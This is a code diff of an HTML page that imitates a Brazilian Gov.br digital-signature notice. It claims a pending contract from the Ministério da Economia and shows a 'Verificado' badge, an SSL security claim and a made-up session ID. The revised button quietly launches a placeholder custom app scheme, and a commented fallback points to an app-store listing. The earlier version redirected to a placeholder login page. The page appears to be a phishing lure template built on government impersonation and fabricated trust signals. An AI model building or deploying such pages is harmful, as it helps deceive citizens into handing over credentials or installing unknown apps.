@@ -3,28 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Documento Oficial - Assinatura</title>
+    <meta name="description" content="Documento Oficial de Assinatura Digital">
+    <title>Gov.br - Assinatura Digital</title>
     <style>
         :root {
-            --primary: #1a237e; /* Azul escuro institucional */
-            --secondary: #304ffe;
-            --success: #2e7d32;
-            --text-main: #212121;
-            --text-sub: #757575;
-            --bg: #f5f5f5;
+            --primary: #1a237e; /* Azul Gov.br */
+            --primary-dark: #10154b;
+            --bg: #f4f5f7;
             --card-bg: #ffffff;
-            --border: #e0e0e0;
+            --text-main: #202124;
+            --text-sub: #5f6368;
+            --border: #dadce0;
+            --success: #0d652d;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: var(--bg);
-            margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             color: var(--text-main);
+            -webkit-font-smoothing: antialiased;
         }
 
         .container {
@@ -33,14 +40,17 @@
             padding: 16px;
         }
 
+        /* Card Principal */
         .card {
             background: var(--card-bg);
             border-radius: 12px;
-            box-shadow: 0 2px 16px rgba(0,0,0,0.06); /* Sombra mais suave e moderna */
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08), 0 4px 16px rgba(0,0,0,0.04);
             border: 1px solid var(--border);
             overflow: hidden;
+            transition: all 0.3s ease;
         }
 
+        /* Cabeçalho */
         .header {
             padding: 20px 24px;
             border-bottom: 1px solid var(--border);
@@ -52,24 +62,39 @@
         .brand {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 12px;
             font-weight: 700;
-            font-size: 18px;
+            font-size: 20px;
             color: var(--primary);
         }
 
-        .header-icon {
-            width: 24px;
-            height: 24px;
+        .brand-icon {
+            width: 32px;
+            height: 32px;
             background: var(--primary);
-            border-radius: 4px;
+            border-radius: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
-            font-size: 14px;
+            font-weight: 900;
+            font-size: 18px;
         }
 
+        .status-badge {
+            background: #e6f4ea;
+            color: var(--success);
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+
+        /* Corpo do Conteúdo */
         .body {
             padding: 24px;
         }
@@ -79,6 +104,7 @@
             margin: 0 0 12px 0;
             font-weight: 600;
             color: var(--text-main);
+            letter-spacing: -0.01em;
         }
 
         p {
@@ -88,75 +114,63 @@
             line-height: 1.5;
         }
 
+        /* Caixa do Arquivo */
         .file-info {
-            background: #f9f9f9;
-            border: 1px solid #eeeeee;
+            background: #f8f9fa;
+            border: 1px solid #e9ecef;
             border-radius: 8px;
             padding: 16px;
             margin-bottom: 24px;
+            border-left: 4px solid var(--primary);
         }
 
         .file-name {
             font-weight: 600;
             font-size: 14px;
             color: var(--text-main);
-            margin-bottom: 8px;
             display: block;
+            margin-bottom: 8px;
         }
 
-        .meta-row {
-            display: flex;
-            justify-content: space-between;
+        .meta {
             font-size: 12px;
             color: var(--text-sub);
-        }
-
-        .badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
-            background: #e8f5e9;
-            color: var(--success);
-            padding: 4px 8px;
-            border-radius: 4px;
-            font-size: 12px;
-            font-weight: 600;
-            margin-bottom: 16px;
-        }
-
-        .btn-group {
             display: flex;
-            flex-direction: column;
-            gap: 12px;
+            justify-content: space-between;
         }
 
+        /* Botão Principal */
         .btn {
             width: 100%;
             padding: 14px;
             border: none;
             border-radius: 6px;
-            font-size: 15px;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: background-color 0.2s ease, transform 0.1s ease;
             display: flex;
             align-items: center;
             justify-content: center;
+            gap: 8px;
         }
 
         .btn-primary {
             background: var(--primary);
             color: white;
+            box-shadow: 0 2px 4px rgba(26, 35, 126, 0.15);
         }
-        .btn-primary:hover { background: #151b66; }
 
-        .btn-secondary {
-            background: white;
-            border: 1px solid var(--border);
-            color: var(--text-main);
+        .btn-primary:hover {
+            background: var(--primary-dark);
         }
-        .btn-secondary:hover { background: #fafafa; border-color: #bdbdbd; }
 
+        .btn-primary:active {
+            transform: scale(0.98);
+            box-shadow: 0 1px 2px rgba(26, 35, 126, 0.15);
+        }
+
+        /* Rodapé de Segurança */
         .footer {
             padding: 16px 24px;
             background: #fafafa;
@@ -165,7 +179,7 @@
         }
 
         .secure {
-            font-size: 11px;
+            font-size: 12px;
             color: var(--text-sub);
             display: flex;
             align-items: center;
@@ -176,8 +190,9 @@
         .session-id {
             font-family: monospace;
             font-size: 11px;
-            color: #9e9e9e;
+            color: #b0b0b0;
             margin-top: 4px;
+            display: block;
         }
     </style>
 </head>
@@ -185,44 +200,39 @@
 
     <div class="container">
         <div class="card">
-            <!-- Cabeçalho Institucional -->
+            <!-- Cabeçalho -->
             <div class="header">
                 <div class="brand">
-                    <div class="header-icon">G</div>
+                    <div class="brand-icon">G</div>
                     <span>Gov.br Digital</span>
                 </div>
-                <!-- Selo de Verificação -->
-                <div class="badge">
-                    <span>✓</span> Documento Verificado
+                <div class="status-badge">
+                    <span>✓</span> Verificado
                 </div>
             </div>
 
+            <!-- Corpo -->
             <div class="body">
                 <h1>Assinatura Pendente</h1>
                 <p>Você recebeu um novo documento para assinatura digital. A validação será realizada via SGP.</p>
 
                 <div class="file-info">
                     <span class="file-name">Contrato_Term_2026_v2.pdf</span>
-                    <div class="meta-row">
-                        <span>Enviado por: Ministério da Economia</span>
-                        <span>27/09/2026 - 18:42</span>
+                    <div class="meta">
+                        <span>Enviado por: Ministério da Economia</span>                
                     </div>
                 </div>
 
-                <div class="btn-group">
-                    <button class="btn btn-primary" id="btn-assinar" onclick="processarLogin()">
-                        Assinar com Gov.br
-                    </button>
-                    
-                    <button class="btn btn-secondary" onclick="window.location.href='https://play.google.com/store/apps/details?id=com.governo.federal.govbr'">
-                        Usar Aplicativo
-                    </button>
-                </div>
+                <!-- Botão de Ação -->
+                <button class="btn btn-primary" onclick="abrirApp()">
+                    Assinar com Gov.br
+                </button>
             </div>
 
+            <!-- Rodapé -->
             <div class="footer">
                 <div class="secure">
-                    🔒 Conexão Criptografada (SSL)
+                    🔒 Conexão Privativa (SSL)
                 </div>
                 <div class="session-id">ID: 88293-441-XP-2026</div>
             </div>
@@ -230,16 +240,21 @@
     </div>
 
     <script>
-        function processarLogin() {
-            const btn = document.getElementById('btn-assinar');
-            btn.innerHTML = 'Verificando...';
-            btn.style.opacity = '0.8';
-            btn.disabled = true;
+        // Função silenciosa para abrir o app
+        function abrirApp() {
+            // Substitua 'seuapp://' pelo protocolo real do seu aplicativo
+            // Exemplo: 'meunegocio://', 'whatsapp://', etc.
+            const appScheme = 'seuapp://';
             
-            setTimeout(() => {
-                // Redireciona para seu sistema de login
-                window.location.href = 'https://seu-app.com/login'; 
-            }, 1000);
+            // Tenta abrir o app
+            window.location.href = appScheme + 'abrir-contrato';
+            
+            // Opcional: Adicionar fallback para loja se o app não estiver instalado
+            // if (navigator.userAgent.match(/Android/i) || navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
+            //     setTimeout(() => {
+            //         window.location.href = 'https://play.google.com/store/apps/details?id=seu.id.app';
+            //     }, 1500);
+            // }
         }
     </script>
 
